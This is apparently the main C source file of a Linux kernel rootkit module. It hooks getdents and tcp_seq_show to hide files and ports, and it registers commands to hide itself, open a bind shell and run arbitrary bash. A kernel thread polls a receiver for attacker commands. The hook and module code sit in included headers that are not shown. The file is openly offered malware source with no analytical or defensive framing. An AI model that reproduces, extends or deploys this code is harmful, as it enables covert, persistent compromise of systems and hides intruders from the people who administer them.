#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/delay.h>

// ktreads
#include <linux/kthread.h>  
#include <linux/wait.h>

// Rootkit receiver
#include "receiver.h"

// Rootkit hooks
#include "hooker/getdents.h"
#include "hooker/tcp_seq_show.h"

// Rootkit modules
#include "mods/hideme.h"
#include "mods/hidedent.h"
#include "mods/hideport.h"
#include "mods/bindshell.h"
#include "mods/runshell.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("default");
MODULE_DESCRIPTION("module");
MODULE_VERSION("0.01");

DECLARE_WAIT_QUEUE_HEAD(runner_wait_queue);

struct task_struct *runner_task = NULL;

void init_rootkit(void)
{
    install_getdents_hook();
    install_tcp_seq_show_hook();

    add_function("HIDEME", hideme);
    add_function("SHOWME", showme);
    add_function("HIDE_DENT", hide_dent);
    add_function("SHOW_HIDDEN_DENT", show_hidden_dent);
    add_function("HIDE_PORT", hide_port);
    add_function("SHOW_HIDDEN_PORT", show_hidden_port);
    add_function("BINDSHELL_CREATE", bindshell_create);
    add_function("RUN_CUSTOM_BASH", run_custom_bash);
}

void clear_rootkit(void)
{
    remove_getdents_hook();
    remove_tcp_seq_show_hook();
    clear_functions();
}

int runner(void *ptr) {
    DECLARE_WAITQUEUE(wq, current);
    add_wait_queue(&runner_wait_queue, &wq);
    while (!kthread_should_stop()) {
        receiver();
        msleep(1000);
    }
    set_current_state(TASK_RUNNING);
    remove_wait_queue(&runner_wait_queue, &wq);
    return 0;
}

static int __init rootkit_example_init(void) 
{
    init_rootkit();

    runner_task = kthread_run(runner, NULL, "kthread_module");
    if (runner_task) {
        get_task_struct(runner_task);
        msleep(1000);
        wake_up(&runner_wait_queue);
    }
    return 0;
}
static void __exit rootkit_example_exit(void) 
{
    kthread_stop(runner_task);
    clear_rootkit();
}

module_init(rootkit_example_init);
module_exit(rootkit_example_exit);
